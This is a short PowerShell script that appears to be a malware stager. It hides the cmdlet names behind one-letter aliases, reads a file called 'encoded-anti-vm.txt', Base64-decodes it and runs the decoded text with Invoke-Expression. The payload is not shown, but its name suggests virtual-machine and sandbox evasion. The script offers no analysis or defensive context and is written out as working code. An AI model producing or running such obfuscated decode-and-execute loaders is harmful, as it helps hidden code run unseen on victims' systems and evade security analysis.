Set-Alias -Name g -Value Get-Content
Set-Alias -Name s -Value Set-Content
Set-Alias -Name i -Value Invoke-Expression

$e = (g "pwsh/encoded-anti-vm.txt")
$d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))
i $d
